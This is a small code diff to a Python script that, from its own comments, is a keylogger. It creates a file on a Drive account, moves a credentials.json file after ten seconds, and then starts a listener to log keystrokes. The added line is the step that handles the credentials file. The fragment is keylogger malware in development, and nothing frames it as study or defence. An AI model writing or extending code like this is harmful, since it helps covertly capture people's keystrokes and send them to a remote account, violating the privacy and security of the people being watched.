@@ -122,6 +122,7 @@ def create_file(drive):
 #___Start___
 file = create_file(drive)
 time.sleep(10)
+file_management('credentials.json')
 # Move credentials.json after 10 seconds of main.py running
 listener()
 # start keylogging
